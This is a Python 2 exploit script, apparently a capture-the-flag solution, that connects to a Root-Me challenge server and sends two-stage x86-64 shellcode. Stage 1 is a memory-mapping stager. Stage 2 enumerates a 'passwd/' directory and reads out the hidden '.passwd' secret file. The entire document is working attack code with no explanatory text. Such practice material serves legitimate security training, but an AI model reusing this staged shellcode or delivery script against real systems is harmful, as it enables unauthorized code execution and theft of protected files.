#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket

host = "challenge01.root-me.org"
port= 52010

def netcat(hostname, port, content):
    print "[+] Opening connection to " + host + " -p " + str(port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = socket.socket( )
    s.connect((hostname, port))
    s.sendall(content)
    s.shutdown(socket.SHUT_WR)

    res = ""

    while 1:

        data = s.recv(1024)

	if data == "":
		break
	res += data

        print res

    print "\n[-] Connection closed to " + host + " -p " + str(port)
    s.close()

stage1 = "\x48\x31\xc0\xb0\x08\x48\x83\xc0\x01\x4d\x31\xc9\x48\x31\xf6\x4d\x31\xc0\x49\x83\xe8\x01\x41\xb2\x22\xb2\x07\x40\xb6\xff\x48\x31\xff\x0f\x05\x48\x89\xc6\xb2\xff\x48\x31\xff\x48\x31\xc0\x0f\x05\xff\xe6"
stage2 = "\xe9\xd3\x00\x00\x00\x5f\x80\x77\x07\x41\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x04\x02\x0f\x05\x48\x89\xc7\x48\x31\xd2\xb2\xff\x48\x29\xd4\x48\x89\xe6\x48\x31\xc0\x04\x4e\x0f\x05\x4c\x8b\x4c\x24\x10\x49\x81\xe1\xff\xff\x00\x00\x4c\x8d\x54\x24\x12\x4d\x31\xdb\x49\xff\xc3\x43\x80\x3c\x1a\x00\x75\xf6\x4c\x89\xda\x48\x31\xff\x48\xff\xc7\x4c\x89\xd6\x48\x31\xc0\x49\x89\xe7\x48\xff\xc0\x0f\x05\x49\x83\xfa\x14\x77\x02\xeb\xc3\xc6\x44\x24\x11\x2f\xc6\x44\x24\x10\x64\xc6\x44\x24\x0f\x77\xc6\x44\x24\x0e\x73\xc6\x44\x24\x0d\x73\xc6\x44\x24\x0c\x61\xc6\x44\x24\x0b\x70\xc6\x44\x24\x0a\x2f\xc6\x44\x24\x09\x2e\x4c\x8d\x6c\x24\x09\x48\x31\xc0\xb0\x02\x4c\x89\xef\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xd2\xb2\x32\x48\x29\xd4\x48\x89\xe6\x48\x31\xc0\x0f\x05\x48\x92\x48\x31\xff\x48\xff\xc7\x48\x89\xe6\x48\x31\xc0\x48\xff\xc0\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\x28\xff\xff\xff\x70\x61\x73\x73\x77\x64\x2f\x41"
lenstage1 = len(stage1)
lenstage2 = len(stage2)

payload = stage1 + stage2

print "Len stage 1 : ", lenstage1
print "Len stage 2 : ", lenstage2

netcat(host, port, payload)